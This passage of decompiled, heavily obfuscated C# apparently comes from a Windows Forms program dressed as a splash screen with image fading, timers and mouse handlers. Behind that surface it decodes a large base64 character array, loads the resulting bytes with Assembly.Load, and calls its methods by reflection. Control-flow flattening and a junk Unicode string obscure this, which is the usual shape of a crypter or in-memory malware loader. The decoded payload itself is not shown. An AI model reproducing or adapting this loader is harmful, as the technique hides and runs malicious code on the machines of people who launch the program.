\u02e7\u02df\u0300\u0315??\u0309\u02df\u02e6\u02f3\u02df\u02f7\u0315????\u02df??\u02f7\u02df\u02f8\u02ef??\u0317\u02df\u02e6\u02eb\u02df\u02ff\u02ef??\u0314\u02df\u02e5\u02d2\u200c??\u200c??\u0316\u02df??\u02d2\u02df\u02eb\u0315\u02df\u0313\u02df??\u200c??\u02ea\u0305\u02df\u0315\u200c??\u200c??\u02ed\u200c??\u02e7\u200c????\u02df\u02ef\u02ef??\u0318\u02df\u02e6\u02eb\u02df\u02f8\u02ef??\u0312\u02df\u02e5\u02e7\u02df\u0300\u02df??\u02d3\u02df??\u200c??\u02f4\u0305??\u030a\u02df\u02e6\u02e7\u02df\u0301\u0315??\u030e\u02df\u02e5\u02d6\u02df\u0300\u0305\u200c??\u02df????\u02df\u02ea\u0305\u02df\u0318\u02df??\u02d2\u02df\u02eb\u200c??\u0313\u02df??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c????\u02ef\u200c??\u02df\u02eb\u200c??\u200c??????\u0305\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u02df", "\u200c??", "\u02df\u02df");
					num = ((int)num2 * -604363086) ^ 0x78F5E5D4;
					continue;
				case 1u:
					string_ = smethod_4(text);
					num = (int)((num2 * 347161375) ^ 0x972ED63);
					continue;
				case 0u:
					num = ((int)num2 * -1271436617) ^ 0x721361A;
					continue;
				case 6u:
					break;
				default:
					return result;
				}
				break;
			}
		}
	}

	private static object smethod_6(char[] char_0)
	{
		int num3 = default(int);
		bool flag = default(bool);
		object result = default(object);
		while (true)
		{
			int num = -681650971;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xA3A4FE2Du) % 13u)
				{
				case 12u:
				{
					int num6;
					if (num3 == 251367153)
					{
						num = -32525487;
						num6 = -32525487;
					}
					else
					{
						num = -222419857;
						num6 = -222419857;
					}
					continue;
				}
				case 11u:
					num = (int)(num2 * 1124213008) ^ -1929335651;
					continue;
				case 10u:
					num = ((int)num2 * -853672974) ^ -1238715735;
					continue;
				case 9u:
					num3 = 251367199;
					num = ((int)num2 * -1732006186) ^ -567928937;
					continue;
				case 8u:
					num = ((int)num2 * -1269262206) ^ 0x703C3221;
					continue;
				case 6u:
					num3 = 251367192;
					num = ((int)num2 * -2083075988) ^ 0x5DFF7BD0;
					continue;
				case 4u:
				{
					int num4;
					int num5;
					if (flag)
					{
						num4 = 433202159;
						num5 = 433202159;
					}
					else
					{
						num4 = 1724211025;
						num5 = 1724211025;
					}
					num = num4 ^ ((int)num2 * -583747091);
					continue;
				}
				case 3u:
					num3 = 251367175;
					num = -1558388134;
					continue;
				case 2u:
					flag = num3 == 251367143;
					num = ((int)num2 * -333825859) ^ -549263419;
					continue;
				case 1u:
					num3 = 251367135;
					num = (int)((num2 * 1330734366) ^ 0x990F9A9);
					continue;
				case 0u:
					result = GForm1.smethod_79(char_0, 0, 22528);
					num = ((int)num2 * -1665983511) ^ -428533966;
					continue;
				case 5u:
					break;
				default:
					return result;
				}
				break;
			}
		}
	}

	public static object smethod_7(object object_0)
	{
		smethod_2((Assembly)object_0);
		object result = default(object);
		while (true)
		{
			int num = 1353954496;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x44BD47C6u) % 3u)
				{
				case 1u:
					goto IL_000d;
				case 0u:
					break;
				default:
					return result;
				}
				break;
				IL_000d:
				num = (int)(num2 * 539692727) ^ -385434432;
			}
		}
	}

	static void smethod_8(Form form_0, EventHandler eventHandler_0)
	{
		form_0.add_Load(eventHandler_0);
	}

	static void smethod_9(Form form_0, FormClosingEventHandler formClosingEventHandler_0)
	{
		form_0.add_FormClosing(formClosingEventHandler_0);
	}

	static void smethod_10(Form form_0)
	{
		Application.Run(form_0);
	}

	static Process smethod_11()
	{
		return Process.GetCurrentProcess();
	}

	static void smethod_12(Process process_0, ProcessPriorityClass processPriorityClass_0)
	{
		process_0.PriorityClass = processPriorityClass_0;
	}

	static string smethod_13()
	{
		return Application.get_StartupPath();
	}

	static string smethod_14(string string_0, string string_1)
	{
		return string_0 + string_1;
	}

	static Image smethod_15(string string_0)
	{
		return Image.FromFile(string_0);
	}

	static void smethod_16(Control control_0, Image image_0)
	{
		control_0.set_BackgroundImage(image_0);
	}

	static Image smethod_17(Control control_0)
	{
		return control_0.get_BackgroundImage();
	}

	static void smethod_18(Timer timer_2)
	{
		timer_2.Start();
	}

	static void smethod_19()
	{
		GC.Collect();
	}

	static void smethod_20(object object_0)
	{
		GC.SuppressFinalize(object_0);
	}

	static int smethod_21(Image image_0)
	{
		return image_0.get_Width();
	}

	static int smethod_22(Image image_0)
	{
		return image_0.get_Height();
	}

	static Bitmap smethod_23(int int_2, int int_3)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Expected O, but got Unknown
		return new Bitmap(int_2, int_3);
	}

	static Graphics smethod_24(Image image_0)
	{
		return Graphics.FromImage(image_0);
	}

	static ColorMatrix smethod_25()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new ColorMatrix();
	}

	static void smethod_26(ColorMatrix colorMatrix_0, float float_1)
	{
		colorMatrix_0.set_Matrix33(float_1);
	}

	static ImageAttributes smethod_27()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new ImageAttributes();
	}

	static void smethod_28(ImageAttributes imageAttributes_0, ColorMatrix colorMatrix_0, ColorMatrixFlag colorMatrixFlag_0, ColorAdjustType colorAdjustType_0)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0003: Unknown result type (might be due to invalid IL or missing references)
		imageAttributes_0.SetColorMatrix(colorMatrix_0, colorMatrixFlag_0, colorAdjustType_0);
	}

	static void smethod_29(Graphics graphics_0, Image image_0, Rectangle rectangle_0, int int_2, int int_3, int int_4, int int_5, GraphicsUnit graphicsUnit_0, ImageAttributes imageAttributes_0)
	{
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		graphics_0.DrawImage(image_0, rectangle_0, int_2, int_3, int_4, int_5, graphicsUnit_0, imageAttributes_0);
	}

	static void smethod_30(Graphics graphics_0)
	{
		graphics_0.Dispose();
	}

	static void smethod_31(Timer timer_2)
	{
		timer_2.Stop();
	}

	static void smethod_32(Timer timer_2, int int_2)
	{
		timer_2.set_Interval(int_2);
	}

	static void smethod_33(Control control_0)
	{
		control_0.Show();
	}

	static void smethod_34(Form form_0)
	{
		form_0.Close();
	}

	static DialogResult smethod_35(string string_0, string string_1, MessageBoxButtons messageBoxButtons_0, MessageBoxIcon messageBoxIcon_0)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0003: Unknown result type (might be due to invalid IL or missing references)
		//IL_0004: Unknown result type (might be due to invalid IL or missing references)
		return MessageBox.Show(string_0, string_1, messageBoxButtons_0, messageBoxIcon_0);
	}

	static void smethod_36(Process process_0)
	{
		process_0.Kill();
	}

	static void smethod_37(CancelEventArgs cancelEventArgs_0, bool bool_3)
	{
		cancelEventArgs_0.Cancel = bool_3;
	}

	static void smethod_38(IDisposable idisposable_0)
	{
		idisposable_0.Dispose();
	}

	static Container smethod_39()
	{
		return new Container();
	}

	static PictureBox smethod_40()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new PictureBox();
	}

	static Timer smethod_41(IContainer icontainer_1)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		return new Timer(icontainer_1);
	}

	static void smethod_42(ISupportInitialize isupportInitialize_0)
	{
		isupportInitialize_0.BeginInit();
	}

	static void smethod_43(Control control_0)
	{
		control_0.SuspendLayout();
	}

	static void smethod_44(Control control_0, Color color_0)
	{
		control_0.set_BackColor(color_0);
	}

	static void smethod_45(Control control_0, ImageLayout imageLayout_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		control_0.set_BackgroundImageLayout(imageLayout_0);
	}

	static void smethod_46(Control control_0, Point point_0)
	{
		control_0.set_Location(point_0);
	}

	static void smethod_47(Control control_0, string string_0)
	{
		control_0.set_Name(string_0);
	}

	static void smethod_48(Control control_0, Size size_0)
	{
		control_0.set_Size(size_0);
	}

	static void smethod_49(PictureBox pictureBox_5, int int_2)
	{
		pictureBox_5.set_TabIndex(int_2);
	}

	static void smethod_50(PictureBox pictureBox_5, bool bool_3)
	{
		pictureBox_5.set_TabStop(bool_3);
	}

	static void smethod_51(ContainerControl containerControl_0, SizeF sizeF_0)
	{
		containerControl_0.set_AutoScaleDimensions(sizeF_0);
	}

	static void smethod_52(ContainerControl containerControl_0, AutoScaleMode autoScaleMode_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		containerControl_0.set_AutoScaleMode(autoScaleMode_0);
	}

	static void smethod_53(Form form_0, Color color_0)
	{
		form_0.set_BackColor(color_0);
	}

	static void smethod_54(Form form_0, Size size_0)
	{
		form_0.set_ClientSize(size_0);
	}

	static ControlCollection smethod_55(Control control_0)
	{
		return control_0.get_Controls();
	}

	static void smethod_56(ControlCollection controlCollection_0, Control control_0)
	{
		controlCollection_0.Add(control_0);
	}

	static Font smethod_57(string string_0, float float_1, FontStyle fontStyle_0, GraphicsUnit graphicsUnit_0, byte byte_0)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0003: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		//IL_000c: Expected O, but got Unknown
		return new Font(string_0, float_1, fontStyle_0, graphicsUnit_0, byte_0);
	}

	static void smethod_58(Control control_0, Font font_0)
	{
		control_0.set_Font(font_0);
	}

	static void smethod_59(Form form_0, FormBorderStyle formBorderStyle_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		form_0.set_FormBorderStyle(formBorderStyle_0);
	}

	static void smethod_60(Form form_0, Padding padding_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		form_0.set_Margin(padding_0);
	}

	static void smethod_61(Form form_0, bool bool_3)
	{
		form_0.set_MaximizeBox(bool_3);
	}

	static void smethod_62(Control control_0, string string_0)
	{
		control_0.set_Name(string_0);
	}

	static void smethod_63(Form form_0, FormStartPosition formStartPosition_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		form_0.set_StartPosition(formStartPosition_0);
	}

	static void smethod_64(Form form_0, string string_0)
	{
		form_0.set_Text(string_0);
	}

	static void smethod_65(ISupportInitialize isupportInitialize_0)
	{
		isupportInitialize_0.EndInit();
	}

	static void smethod_66(Control control_0, bool bool_3)
	{
		control_0.ResumeLayout(bool_3);
	}

	static MethodInfo[] smethod_67(Type type_0)
	{
		return type_0.GetMethods();
	}

	static object smethod_68(object object_0, string string_0, CallType callType_0, object[] object_1)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		return Versioned.CallByName(object_0, string_0, callType_0, object_1);
	}

	static Type[] smethod_69(Assembly assembly_0)
	{
		return assembly_0.GetTypes();
	}

	static Assembly smethod_70(byte[] byte_0)
	{
		return Assembly.Load(byte_0);
	}

	static char smethod_71(string string_0, int int_2)
	{
		return string_0[int_2];
	}

	static string smethod_72(char char_0)
	{
		return Conversions.ToString(char_0);
	}

	static int smethod_73(string string_0)
	{
		return Strings.AscW(string_0);
	}

	static char smethod_74(int int_2)
	{
		return Strings.Chr(int_2);
	}

	static int smethod_75(string string_0)
	{
		return string_0.Length;
	}

	static string smethod_76(string string_0, string string_1, string string_2)
	{
		return string_0.Replace(string_1, string_2);
	}

	static char[] smethod_77(string string_0)
	{
		return string_0.ToCharArray();
	}

	static object smethod_78(object object_0)
	{
		return RuntimeHelpers.GetObjectValue(object_0);
	}

	static byte[] smethod_79(char[] char_0, int int_2, int int_3)
	{
		return Convert.FromBase64CharArray(char_0, int_2, int_3);
	}

	static void smethod_80(Timer timer_2, EventHandler eventHandler_0)
	{
		timer_2.remove_Tick(eventHandler_0);
	}

	static void smethod_81(Timer timer_2, EventHandler eventHandler_0)
	{
		timer_2.add_Tick(eventHandler_0);
	}

	static void smethod_82(Control control_0, EventHandler eventHandler_0)
	{
		control_0.remove_MouseEnter(eventHandler_0);
	}

	static void smethod_83(Control control_0, EventHandler eventHandler_0)
	{
		control_0.remove_MouseLeave(eventHandler_0);
	}

	static void smethod_84(Control control_0, MouseEventHandler mouseEventHandler_0)
	{
		control_0.remove_MouseClick(mouseEventHandler_0);
	}

	static void smethod_85(Control control_0, EventHandler eventHandler_0)
	{
		control_0.add_MouseEnter(eventHandler_0);
	}

	static void smethod_86(Control control_0, EventHandler eventHandler_0)
	{
		control_0.add_MouseLeave(eventHandler_0);
	}

	static void smethod_87(Control control_0, MouseEventHandler mouseEventHandler_0)
	{
		control_0.add_MouseClick(mouseEventHandler_0);
	}
}
